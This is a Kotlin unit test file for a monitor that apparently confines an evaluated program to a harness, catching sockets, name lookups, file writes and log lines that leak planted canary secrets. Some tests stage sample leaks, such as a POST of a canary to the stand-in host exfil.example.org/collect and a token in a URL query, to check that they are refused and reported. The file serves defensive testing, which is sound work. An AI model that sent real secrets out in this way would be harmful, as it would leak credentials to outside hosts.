package net.jonbell.pcs.runner

import kotlinx.serialization.json.boolean
import kotlinx.serialization.json.jsonObject
import kotlinx.serialization.json.jsonPrimitive
import net.jonbell.pcs.testing.Covers
import net.jonbell.pcs.testing.Family
import org.junit.jupiter.api.AfterEach
import org.junit.jupiter.api.Assertions.assertEquals
import org.junit.jupiter.api.Assertions.assertFalse
import org.junit.jupiter.api.Assertions.assertTrue
import org.junit.jupiter.api.BeforeEach
import org.junit.jupiter.api.Test
import org.junit.jupiter.api.assertThrows
import java.net.InetAddress
import java.net.ServerSocket
import java.net.URI
import java.net.UnknownHostException
import java.net.http.HttpClient
import java.net.http.HttpRequest
import java.net.http.HttpResponse
import java.nio.file.Files
import kotlin.concurrent.thread

/**
 * The boundary observer and its controls (PLAN §A6, §A8) against a stub harness on a local socket, so
 * `./gradlew check` needs no Docker. The integration suite repeats the controls against the real harness.
 */
@Family("T7")
class ObserverUnitTest {
    private lateinit var stub: ServerSocket
    private lateinit var harness: URI

    @BeforeEach
    fun startStub() {
        stub = ServerSocket(0, 50, InetAddress.getLoopbackAddress())
        harness = URI("http://127.0.0.1:${stub.localPort}")
        thread(isDaemon = true) {
            while (!stub.isClosed) {
                val s = runCatching { stub.accept() }.getOrNull() ?: break
                thread(isDaemon = true) {
                    s.use {
                        // read the request head, then any body the client sends, and answer
                        val i = s.getInputStream()
                        var last = 0
                        while (last != 0x0d0a0d0a) last = (last shl 8) or i.read().also { if (it < 0) return@use }
                        Thread.sleep(50)
                        s.getOutputStream().write("HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok".toByteArray())
                    }
                }
            }
        }
    }

    @AfterEach
    fun stopStub() {
        stub.close()
        ProxyReset.restore()
    }

    private fun caught(c: kotlinx.serialization.json.JsonObject) = c["caught"]!!.jsonPrimitive.boolean

    @Test
    @Covers("prop:H4")
    fun `the observer sees every socket to the harness, and the mutant that forgets one is caught`() {
        assertFalse(caught(Controls.socketControl(harness, "tok", ObserverFaults())))
        assertTrue(caught(Controls.socketControl(harness, "tok", ObserverFaults(missesSocket = true))))
    }

    @Test
    @Covers("prop:H4")
    fun `the file monitor sees nested writes, and the mutant that looks one level deep is caught`() {
        assertFalse(caught(Controls.fileControl(ObserverFaults())))
        assertTrue(caught(Controls.fileControl(ObserverFaults(missesFileWrite = true))))
    }

    @Test
    @Covers("prop:C1")
    fun `the canary scan finds a canary mid-body, and the mutant that scans only the head is caught`() {
        assertFalse(caught(Controls.canaryControl(harness, ObserverFaults())))
        assertTrue(caught(Controls.canaryControl(harness, ObserverFaults(missesCanary = true))))
    }

    @Test
    @Covers("prop:C1", "prop:H4")
    fun `a canary sent to a non-harness host is refused and reported`() {
        val planted = Canary("planted", "CANARY-PLANTED-REVIEW-7731", allowedOnHarnessWire = false)
        BoundaryObserver(harness, listOf(planted)).use { o ->
            o.installJvmWide()
            val resp =
                HttpClient.newHttpClient().send(
                    HttpRequest.newBuilder(
                        URI("http://exfil.example.org/collect"),
                    ).POST(HttpRequest.BodyPublishers.ofString("review: ${planted.value}")).build(),
                    HttpResponse.BodyHandlers.ofString(),
                )
            assertEquals(403, resp.statusCode())
            val v = o.violations().map { it.kind to it.detail }
            assertTrue(v.any { it.first == "non-harness-destination" && it.second.startsWith("exfil.example.org") }, v.toString())
            assertTrue(v.any { it.first == "canary-to-non-harness-host" }, v.toString())
        }
    }

    @Test
    @Covers("prop:H4")
    fun `traffic to the harness is allowed and the token may appear only in the Authorization header`() {
        val tok = Canary("token", "hct_unit_test_token", allowedOnHarnessWire = true, allowedAuthorizationHeader = true)
        BoundaryObserver(harness, listOf(tok.copy(allowedOnHarnessWire = false))).use { o ->
            val http = HttpClient.newHttpClient()
            http.send(
                HttpRequest.newBuilder(URI("${o.frontUrl}/api/whoami")).header("Authorization", "Bearer ${tok.value}").build(),
                HttpResponse.BodyHandlers.ofString(),
            )
            assertEquals(emptyList<Violation>(), o.violations())
            http.send(HttpRequest.newBuilder(URI("${o.frontUrl}/api/whoami?leak=${tok.value}")).build(), HttpResponse.BodyHandlers.ofString())
            assertTrue(o.violations().any { it.kind == "canary-on-wire" }, o.violations().toString())
        }
    }

    @Test
    @Covers("prop:H4")
    fun `a direct lookup of a non-harness name is refused by the resolver`() {
        BoundaryObserver(harness, emptyList()).use { o ->
            assertThrows<UnknownHostException> { InetAddress.getByName("exfil-direct.example.org") }
            assertTrue(o.violations().any { it.kind == "refused-name-lookup" && it.detail == "exfil-direct.example.org" })
        }
    }

    @Test
    @Covers("prop:H5")
    fun `a planted log line holding the token and a file holding the database key are caught`() {
        val cs = listOf(Canary("token", "hct_unit_test_token", true, true), Canary("db-key", "CANARY-DBKEY-1", false))
        val dir = Files.createTempDirectory("pcs-canary-files")
        val mon = FileWriteMonitor(listOf(dir), cs)
        LogCapture(cs).use { logs ->
            logs.start()
            mon.start()
            println("debug: Authorization: Bearer ${cs[0].value}")
            Files.writeString(dir.resolve("notes.txt"), "key=${cs[1].value}")
            assertEquals(listOf("token"), logs.hits())
        }
        assertEquals(listOf("db-key"), mon.written().single().canaries)
        dir.toFile().deleteRecursively()
    }

    @Test
    fun `the control entries carry what check-evidence needs`() {
        val c = Controls.canaryControl(harness, ObserverFaults())
        assertEquals("positive", c["polarity"]!!.jsonPrimitive.content)
        assertTrue(c["observer"]!!.jsonObject.containsKey("planted"))
    }
}
